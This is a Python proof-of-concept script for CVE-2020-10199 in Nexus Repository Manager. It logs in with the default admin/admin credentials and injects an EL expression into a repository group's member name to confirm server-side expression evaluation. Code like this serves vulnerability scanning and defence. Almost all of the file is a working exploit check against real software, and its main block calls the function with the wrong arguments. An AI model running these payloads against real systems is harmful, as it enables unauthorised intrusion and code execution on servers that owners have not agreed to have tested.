#!/usr/bin/python3
# -*- coding:utf-8 -*-

import base64
import requests
import json
csrf = "0.15080630880112578"
def get_sessionid(ip, port, password):
    url = "http://" + ip + ":" + port
    login_url = url + "/service/rapture/session" # 登录url
    head = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = {'username': str(base64.b64encode("admin".encode('utf-8')))[2:-1], 'password': str(base64.b64encode(password.encode('utf-8')))[2:-1]}
    print(payload)
    resp = requests.request("post", login_url, data=payload, headers=head).headers
    return resp['Set-Cookie'].split(";")[0].split('=')[1]

def poc(url, timeout=10):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    ip = parsed.hostname or parsed.netloc.split(':')[0]
    port = parsed.port or (8081 if parsed.scheme == 'http' else None)
    password = "admin"
    
    target_url = "http://" + ip + ":" + str(port)
    try:
        sessionid = get_sessionid(ip, str(port), password)
        print(sessionid)
        headers = {
            "Host": "%s:%s" % (ip, port),
            "Referer": target_url,
            "X-Nexus-UI": "true",
            "X-Requested-With": "XMLHttpRequest",
            "NX-ANTI-CSRF-TOKEN": csrf,
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
            "Cookie": "NX-ANTI-CSRF-TOKEN=%s; NXSESSIONID=%s" % (csrf, sessionid),
            "Origin": target_url,
            "Connection": "close"
            }
        vulurl = target_url + "/service/rest/beta/repositories/go/group"
        payload = {"name": "internal", "online": "true", "storage": {"blobStoreName": "default", "strictContentTypeValidation": "true"}, "group": {"memberNames": ["$\\A{233*233}"]}}
        r = requests.post(vulurl, data=json.dumps(payload), headers=headers, timeout=timeout)
        if "A54289" in r.text:
            print ("[+] CVE-2020-10199 vulnerability exists. exp as https://github.com/zhzyker/exphub")
            return True, 'Nexus CVE-2020-10199: 存在漏洞'
        else:
            print ("[-] CVE-2020-10199 vulnerability does not exist.")
            return False, 'Nexus CVE-2020-10199: 安全'
    except Exception as e:
        return False, f'Nexus CVE-2020-10199: 扫描失败 - {str(e)}'

if __name__ == "__main__":
    ip = "127.0.0.1"
    port="8081"
    password="admin"
    # get_sessionid(ip, port, "admin")
    poc(ip, port, password)